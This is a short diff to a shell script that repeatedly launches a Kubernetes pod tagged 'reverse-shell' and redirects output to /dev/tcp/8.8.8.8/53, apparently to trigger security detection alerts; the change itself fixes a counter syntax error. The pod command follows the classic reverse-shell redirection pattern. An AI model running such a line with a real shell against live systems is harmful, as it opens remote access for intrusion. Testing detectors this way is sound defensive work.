@@ -39,5 +39,5 @@ do
     tag2="reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
     kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag2" -- bash -c "/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1"
     sleep 60
-    ((counter--)
+    ((counter--))
 done
